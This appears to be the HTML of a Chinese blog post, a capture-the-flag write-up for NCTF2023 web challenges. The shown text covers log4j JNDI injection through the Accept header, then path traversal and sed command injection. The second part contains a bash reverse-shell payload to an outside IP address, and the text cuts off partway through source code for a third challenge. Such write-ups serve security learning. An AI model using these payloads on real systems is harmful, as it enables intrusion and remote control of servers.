@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        hexo-theme-suka © SukkaW
+        GitHub: https://github.com/SukkaW/hexo-theme-suka
+    -->
+
+    <!-- ### Resource Hint ### -->
+
+    <!-- ## DNS Prefetch ## -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+<!-- busuanzi -->
+
+
+<!-- comment -->
+
+
+
+
+
+
+
+<!-- analytics -->
+
+
+
+
+
+
+
+    <!-- ## Preload ## -->
+    
+
+
+
+
+    <!-- ### Meta & Title & Info ### -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <meta name="renderer" content="webkit">
+
+    <!-- Title -->
+    <title>NCTF2023学习 | Z1d10tのBlog</title>
+
+    <!-- Favicons -->
+    <link rel="icon" type="image&#x2F;ico" href="/img/suka-favicon.ico">
+
+    <!-- ### Import File ### -->
+    <link rel="stylesheet" href="/lib/spectre/spectre.min.css"><style>
+    body {
+        background-color: #f8f9fa;
+    }
+
+    a, a:visited {
+        color: #0070ff;
+    }
+
+    a:active, a:focus, a:hover {
+        color: #0070ff;
+        opacity: .75;
+    }
+
+    #post-content a,
+    #post-content a:hover,
+    #post-content a:focus,
+    #post-content a:visited {
+        color: #005eb9;
+        opacity: 1;
+    }
+
+    
+
+    .post-entry .card-body a {
+        color: #0070ff;
+    }
+
+    .avatar {
+        background: #444;
+    }
+
+    .navbar-link,
+    .navbar-link:visited,
+    .timeline .timeline-item .timeline-icon.icon-lg {
+        color: #0070ff;
+    }
+
+    .navbar-link:hover {
+        color: #0070ff;
+        opacity: .8;
+    }
+
+    #search-input .btn,
+    #disqus_click_btn,
+    #disqus-switch-to-direct,
+    #disqus-loadmore-button {
+        background: #727e96;
+        border-color: #727e96;
+        color: #fff;
+    }
+
+    #post-toc a.post-toc-link,
+    #post-toc a.post-toc-link:visited,
+    .share-menu.menu .menu-item>a {
+        color: #727e96;
+    }
+
+    .share-menu.menu .menu-item>a:hover,
+    .share-menu.menu .menu-item>a:focus,
+    .share-menu.menu .menu-item>a:visited {
+        color: #50596c;
+        background: #f8f9fa;
+        opacity: .85;
+    }
+</style><link rel="stylesheet" href="/css/style.min.css">
+
+
+
+
+
+
+
+
+    <!-- Prettify Theme -->
+    
+    <link rel="preload" href="/css/highlight/github.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="/css/highlight/github.min.css"></noscript>
+
+
+
+
+
+<script>
+/*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+!function(t){"use strict";t.loadCSS||(t.loadCSS=function(){});var e=loadCSS.relpreload={};if(e.support=function(){var e;try{e=t.document.createElement("link").relList.supports("preload")}catch(t){e=!1}return function(){return e}}(),e.bindMediaToggle=function(t){var e=t.media||"all";function a(){t.addEventListener?t.removeEventListener("load",a):t.attachEvent&&t.detachEvent("onload",a),t.setAttribute("onload",null),t.media=e}t.addEventListener?t.addEventListener("load",a):t.attachEvent&&t.attachEvent("onload",a),setTimeout(function(){t.rel="stylesheet",t.media="only x"}),setTimeout(a,3e3)},e.poly=function(){if(!e.support())for(var a=t.document.getElementsByTagName("link"),n=0;n<a.length;n++){var o=a[n];"preload"!==o.rel||"style"!==o.getAttribute("as")||o.getAttribute("data-loadcss")||(o.setAttribute("data-loadcss",!0),e.bindMediaToggle(o))}},!e.support()){e.poly();var a=t.setInterval(e.poly,500);t.addEventListener?t.addEventListener("load",function(){e.poly(),t.clearInterval(a)}):t.attachEvent&&t.attachEvent("onload",function(){e.poly(),t.clearInterval(a)})}"undefined"!=typeof exports?exports.loadCSS=loadCSS:t.loadCSS=loadCSS}("undefined"!=typeof global?global:this);
+</script>
+
+    <!-- ### Site Verification ### -->
+    
+
+
+    <meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Z1d10tのBlog"><meta name="msapplication-starturl" content="https://z1d10t.fun"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Z1d10tのBlog"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+    <!-- ### The Open Graph & Twitter Card Protocol ### -->
+    <meta property="og:title" content="NCTF2023学习 | Z1d10tのBlog"><meta property="og:site_name" content="Z1d10tのBlog"><meta property="og:type" content="article"><meta property="og:url" content="https://z1d10t.fun/post/ad0eb4be.html"><meta property="og:locale" content="zh-CN"><meta name="description" content="NCTF2023学习 - Z1d10t - Z1d10tのBlog"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707108635415-633a0d58-3d6b-4807-8f3d-93a19af21bf7.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707108933959-c9377fd8-0dbc-4b0b-8009-e8b1933e4f51.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707109309619-e4e72221-5635-492f-add4-83038cc30886.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707111725458-195820fc-e1f2-4eb9-bbfc-87b59ecb9064.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707111654925-92f362c0-d7d2-4b31-ad6b-80bf8ea5dab3.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116858231-90f8e135-d1a2-4ee5-ab65-16e2b83bc76f.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116584160-c8dec344-445e-4b4b-b7ad-fdf8c9a37f43.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116900607-84865e2f-9506-418c-92f6-ae77aa6322e3.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707117841890-a676e71f-c159-4565-8aea-eee5bb540b82.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118403799-dd68d48e-9449-43f4-99fc-b3d4767accb0.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118249251-a7fc75f7-36f6-4440-a00f-c2bf08469ca1.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118266106-1ed123d2-5bc0-4190-8af3-c6593d6eccbf.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124205087-85881633-48f1-4609-8e34-bfb92bb68ee1.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707121981909-234a9ea1-a03d-4e81-a0a2-522f4dce4a15.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707122445762-5cb47def-f2d2-4f76-953f-c517b62e3caa.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124557396-8dc09cd8-a765-4813-80e4-7d1d5adedc6e.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124883100-619e262c-02dd-44cc-8458-51e6173dcee2.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707125921213-d9589dd6-2f9a-44e2-83d1-a5061d8aa74b.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707369999289-a775c507-85fa-496d-9374-37e6658e0fbf.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707370146347-676e2ecc-fe64-4993-bc27-baa9d5f44346.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707376834751-532d80ef-7f64-407e-b1cb-0a02b632e546.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707381987765-4e279843-4651-4623-9841-cefbcfc80f1d.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707379693762-a99cbe8a-b338-4536-8eb6-deed6aa0d94b.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707379874775-1c1c6f97-3ae0-4d60-8ef0-7c94077970c6.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380679253-5f329d9f-1471-4ea2-a0af-a5d2bfe7c93c.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380332237-2d15b9a6-f885-44ab-9f3e-12e79705204b.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707380341369-b800c902-c363-4399-8a25-01209b02088f.png"><meta property="article:published_time" content="2024-02-08T08:51:48.000Z"><meta property="article:modified_time" content="2024-02-08T08:52:41.900Z"><meta property="og:updated_time" content="2024-02-08T08:52:41.900Z"><meta property="article:author" content="Z1d10t"><meta name="twitter:card" content="summary">
+
+    
+
+    <!-- ### Canonical link ### -->
+    <link rel="canonical" href="https://z1d10t.fun/post/ad0eb4be.html">
+
+    <meta name="generator" content="Hexo 6.3.0">
+
+    <!-- ### Analytics ### -->
+    
+
+
+
+
+
+
+
+    <!-- ### Structured Data ### -->
+    
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "url": "https://z1d10t.fun/post/ad0eb4be.html",
+    "@type": "BlogPosting",
+    "logo": "https://z1d10t.fun/img/suka-favicon.ico",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://z1d10t.fun/post/ad0eb4be.html"
+    },
+    "headline": "NCTF2023学习 | Z1d10tのBlog",
+    
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://z1d10t.fun/img/suka-favicon.ico"
+    },
+    
+    "datePublished": "2024-02-08T08:51:48.000Z",
+    "dateModified": "2024-02-08T08:52:41.900Z",
+    "author": {
+        "@type": "Person",
+        "name": "Z1d10t",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png"
+        },
+        "description": "A note for myself,have fun!"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "Z1d10tのBlog",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://z1d10t.fun/img/suka-favicon.ico"
+        }
+    },
+    
+    "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://z1d10t.fun/search/?s={search_term_string}",
+        "query-input": "required name=search_term_string"
+    },
+    
+    "keywords": "",
+    "description": "NCTF2023学习 - Z1d10t - Z1d10tのBlog"
+}
+</script>
+
+
+
+    <!-- ### Custom Head ### -->
+    
+</head>
+
+    <body>
+            
+
+            <!-- ### Main content ### -->
+            <!-- ## Header ##-->
+<header>
+    <h1 class="header-title text-center"><a href="/">Z1d10tのBlog</a></h1>
+
+    <p class="text-center header-slogan">
+        
+            
+                A note for myself,have fun!
+            
+        
+    </p>
+
+    <nav class="navbar-section text-center">
+    
+        <a href="/" class="navbar-link">Home</a>
+    
+    
+        <a href="/archives/" class="navbar-link">Archives</a>
+    
+    
+        <a href="/search/" class="navbar-link">Search</a>
+    
+    
+        <a href="/about/" class="navbar-link">About</a>
+    
+        <a href="/links/" class="navbar-link">Friends</a>
+    
+    
+    
+</nav>
+</header>
+
+            
+    <!-- ## Post ## -->
+    <div class="post-container">
+    <div id="post-card" class="card">
+        
+        <div class="card-item-container">
+            <div class="card-inner-cell">
+                <!-- # Post Header Info # -->
+                <div class="card-header">
+                    
+    <h1 class="card-title h3 mb-2">NCTF2023学习</h1>
+
+
+
+
+<div class="post-header-info">
+    <p class="post-header-info-left text-gray">
+        <img class="author-thumb lazyload" data-src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png" src="/img/suka-lazyload.gif" alt="Z1d10t's Avatar">
+        <span>2024-02-08</span>
+        
+            <span class="suka-devide-dot"></span>
+            <a class="category-link" href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/">各赛事WP</a>
+        
+        
+        
+    </p>
+    <div class="post-header-info-right">
+        
+            <div class="dropdown dropdown-right">
+<a class="dropdown-toggle" tabindex="0">分享本文</a>
+<ul class="menu share-menu">
+    <!-- Share Weibo -->
+    
+    <li class="menu-item">
+        <a href="http://service.weibo.com/share/share.php?appkey=&title=NCTF2023学习&url=https://z1d10t.fun/post/ad0eb4be.html&pic=https://z1d10t.fun/img/suka-favicon.ico&searchPic=false&style=simple" target="_blank" rel="external noopener noreferrer nofollow">分享到微博</a>
+    </li>
+    
+
+    <!-- Share Twitter -->
+    
+    <li class="menu-item">
+        <a href="https://twitter.com/intent/tweet?text=NCTF2023学习&url=https://z1d10t.fun/post/ad0eb4be.html&via=Z1d10t" target="_blank" rel="external noopener noreferrer nofollow">分享到 Twitter</a>
+    </li>
+    
+
+    <!-- Share Facebook -->
+    
+    <li class="menu-item">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https://z1d10t.fun/post/ad0eb4be.html" target="_blank" rel="external noopener noreferrer nofollow">分享到 Facebook</a>
+    </li>
+    
+
+    <!-- Share Google+ -->
+    
+    <li class="menu-item">
+        <a href="https://plus.google.com/share?url=https://z1d10t.fun/post/ad0eb4be.html" target="_blank" rel="external noopener noreferrer nofollow">分享到 Google+</a>
+    </li>
+    
+
+    <!-- Share LinkedIn -->
+    
+    <li class="menu-item">
+        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://z1d10t.fun/post/ad0eb4be.html&title=Z1d10tのBlog" target="_blank" rel="external noopener noreferrer nofollow">分享到 LinkedIn</a>
+    </li>
+    
+
+    <!-- Share QQ -->
+    
+    <li class="menu-item">
+        <a href="http://connect.qq.com/widget/shareqq/index.html?site=Z1d10tのBlog&title=Z1d10tのBlog&summary=邪王真眼是最强的！&pics=https://z1d10t.fun/img/suka-favicon.ico&url=https://z1d10t.fun/post/ad0eb4be.html" target="_blank" rel="external noopener noreferrer nofollow"> 分享到 QQ</a>
+    </li>
+    
+
+    <!-- Share Telegram -->
+    
+    <li class="menu-item">
+        <a href="https://t.me/share/url?url=https://z1d10t.fun/post/ad0eb4be.html&text=Z1d10tのBlog" target="_blank" rel="external noopener noreferrer nofollow">分享到 Telegram</a>
+    </li>
+    
+
+    <!-- QRCode -->
+    
+    <li class="menu-item">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAACECAAAAAB0L9x7AAABhklEQVR42u3bQQ7CMAxE0d7/0mWFhFDtGadQpuh3g4AQHpIVO3HZ9oBrAwECxC0QW3MdjXk+f33vfZw9L4hYxGHQHLzewd7HOPOCyEZUwVd9WRWI7rwg7o1wArb6HIj/RLjJzQlsEPdBVIlmPPE3siiIyxFd8J15/Fi1DeJShNy0HqC6QqYKyFO7chCXIrpAcjDdotXNByIfoZJYNf5MoQwiH9EVMLJAaTbD9mIFIgIxKVDdZKV+GIhshAouB7kaoCAyEZOmirOoLSUwEFGIlQSmDt3tsSAiEV3DxN3kdOPaBRBENMKd1GnUVsEpAxNEBKI6+OgWKmcD7SQ0ELmIKuGopr0TjG2BDCIe4Wx4VBBPimYQ2QjnsFwdrKiGnrwBEEQEwmnEuU18Z/EDkY9wGuuqYJkcnrSFLogYxGrRqg7hZWEMIhoxuQGwK3Kd4gbEfyEmjRW1wIG4N2I3/2S0iz8gnQpMEJciJs0T9WXuzQAgchGrNwo7yW10wA4iAvHLCwQIENGIB3p6uXm0BY7bAAAAAElFTkSuQmCC" alt="QRCode">
+    </li>
+    
+
+</ul>
+</div>
+        
+    </div>
+</div>
+                </div>
+                <div class="card-body">
+                    
+                        
+                        
+                            <div id="post-toc"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#logging"><span class="post-toc-number">1.</span> <span class="post-toc-text">logging</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Webshell-Generator"><span class="post-toc-number">2.</span> <span class="post-toc-text">Webshell Generator</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Wait-What"><span class="post-toc-number">3.</span> <span class="post-toc-text">Wait What</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ez-wordpress"><span class="post-toc-number">4.</span> <span class="post-toc-text">ez_wordpress</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#EvilMQ"><span class="post-toc-number">5.</span> <span class="post-toc-text">EvilMQ</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#house-of-click"><span class="post-toc-number">6.</span> <span class="post-toc-text">house of click</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%8B%BFtoken"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">拿token</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#insert%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">insert上传文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E6%80%BB%E7%BB%93"><span class="post-toc-number">7.</span> <span class="post-toc-text">总结</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="post-toc-number">8.</span> <span class="post-toc-text">参考：</span></a></li></ol></div>
+                        
+                    
+                    <article id="post-content">
+                        <p>NCTF2023学习</p>
+<span id="more"></span>
+
+<h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p>考点：</p>
+<ul>
+<li>log4j</li>
+</ul>
+<p>进入界面啥也没有</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707108635415-633a0d58-3d6b-4807-8f3d-93a19af21bf7.png" alt="img"></p>
+<p>根据题目提示可能考的是log4j，既然知道了那么JNDI的注入点应该在哪里呢</p>
+<p>那只有试试请求头参数了</p>
+<p>当试到<code>Accept</code>请求头时候，出现了406响应码</p>
+<p> Accept 头, 如果 mine type 类型不对控制台会调用 logger 输出日志，还有 Host 头, 但是只能用一次, 第二次往后就不能再打印日志了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707108933959-c9377fd8-0dbc-4b0b-8009-e8b1933e4f51.png" alt="img"></p>
+<p>HTTP 406状态码是指”不可接受”（Not Acceptable）。服务器收到的请求中包含了一个或多个要求资源的表示形式，但服务器无法生成与请求中所述的任何形式相匹配的响应。这意味着服务器无法提供与请求的Accept标头中指定的格式相匹配的响应。</p>
+<p>这里存在JNDI注入点</p>
+<p>进一步测试</p>
+<p>发现确实存在 并且是出网的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707109309619-e4e72221-5635-492f-add4-83038cc30886.png" alt="img"></p>
+<p>那么我们起一个LDAP服务 带一个反弹shell的恶意类即可 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707111725458-195820fc-e1f2-4eb9-bbfc-87b59ecb9064.png" alt="img"></p>
+<p>推荐项目：<a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707111654925-92f362c0-d7d2-4b31-ad6b-80bf8ea5dab3.png" alt="img"></p>
+<h1 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h1><p>点击下载我们的webshel之后，抓包</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116858231-90f8e135-d1a2-4ee5-ab65-16e2b83bc76f.png" alt="img"></p>
+<p>发现路由重定向 一眼丁真这里可能存在路径穿越<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116584160-c8dec344-445e-4b4b-b7ad-fdf8c9a37f43.png" alt="img"></p>
+<p>可以</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707116900607-84865e2f-9506-418c-92f6-ae77aa6322e3.png" alt="img"></p>
+<p>根目录flag文件不是<code>/flag </code>并且环境变量中的flag也被删了</p>
+<p>还是老老实实来分析 首先看看index.php和 download.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/download.php?file=/tmp/../../../var/www/html/index.php&amp;filename=</span><br><span class="line">&lt;?php</span><br><span class="line">function security_validate()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">        if (preg_match(&#x27;/\r|\n/&#x27;, $value)) &#123;</span><br><span class="line">            die(&quot;$key 不能包含换行符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strlen($value) &gt; 114) &#123;</span><br><span class="line">            die(&quot;$key 不能超过114个字符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">security_validate();</span><br><span class="line">if (@$_POST[&#x27;method&#x27;] &amp;&amp; @$_POST[&#x27;key&#x27;] &amp;&amp; @$_POST[&#x27;filename&#x27;]) &#123;</span><br><span class="line">    if ($_POST[&#x27;language&#x27;] !== &#x27;PHP&#x27;) &#123;</span><br><span class="line">        die(&quot;PHP是最好的语言&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">    $key = $_POST[&#x27;key&#x27;];</span><br><span class="line">    putenv(&quot;METHOD=$method&quot;) or die(&quot;你的method太复杂了！&quot;);</span><br><span class="line">    putenv(&quot;KEY=$key&quot;) or die(&quot;你的key太复杂了！&quot;);</span><br><span class="line">    $status_code = -1;</span><br><span class="line">    $filename = shell_exec(&quot;sh generate.sh&quot;);</span><br><span class="line">    if (!$filename) &#123;</span><br><span class="line">        die(&quot;生成失败了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = trim($filename);</span><br><span class="line">    header(&quot;Location: download.php?file=$filename&amp;filename=&#123;$_POST[&#x27;filename&#x27;]&#125;&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">    header(&quot;Content-Disposition: attachment; filename=$filename&quot;);</span><br><span class="line">    readfile($file);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>index.php通过<code>$filename = shell_exec(&quot;sh generate.sh&quot;);</code>来帮我们生成文件名</p>
+<p>读来看看<code>generate.sh</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-<span class="number">9</span> &lt;/dev/urandom | head -c <span class="number">16</span>)</span><br><span class="line">cp template.php <span class="string">&quot;/tmp/$NEW_FILENAME&quot;</span></span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/$KEY/g&quot;</span> <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/$METHOD/g&quot;</span> <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br><span class="line"></span><br><span class="line">realpath <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们输入的方法和webshell密码都会被导出到环境变量中 然后sh脚本文件会从环境变量中读入我们的方法和webshell密码然后拼接到sed命令中</p>
+<p>那么这里可能存在shell命令注入 但是不行 只能展开为单个参数</p>
+<p>查看sed命令选项 发现<code>-e</code>可以执行系统命令</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707117841890-a676e71f-c159-4565-8aea-eee5bb540b82.png" alt="img"></p>
+<p>根据man手册[<a target="_blank" rel="noopener" href="https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can%20be%20separated%20by%20semicolons%20(%3B)]">https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can%20be%20separated%20by%20semicolons%20(%3B)]</a>(<a target="_blank" rel="noopener" href="https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can">https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can</a> be separated by semicolons (%3B))</p>
+<p>sed指令可以通过换行符分隔，也可以通过<code>;</code>分隔。</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118403799-dd68d48e-9449-43f4-99fc-b3d4767accb0.png" alt="img"></p>
+<p>我们的payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span>/g;e bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1&quot;</span>;</span><br><span class="line">会被拼接为：</span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/123/g;e bash -c &quot;</span>bash -i &gt;&amp; /dev/tcp/<span class="number">124.221</span><span class="number">.177</span><span class="number">.174</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="string">&quot;;/g&quot;</span> <span class="string">&quot;$NEW_FILENAME&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118249251-a7fc75f7-36f6-4440-a00f-c2bf08469ca1.png" alt="img"></p>
+<p>成功</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707118266106-1ed123d2-5bc0-4190-8af3-c6593d6eccbf.png" alt="img"></p>
+<h1 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What"></a>Wait What</h1><p>给了源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 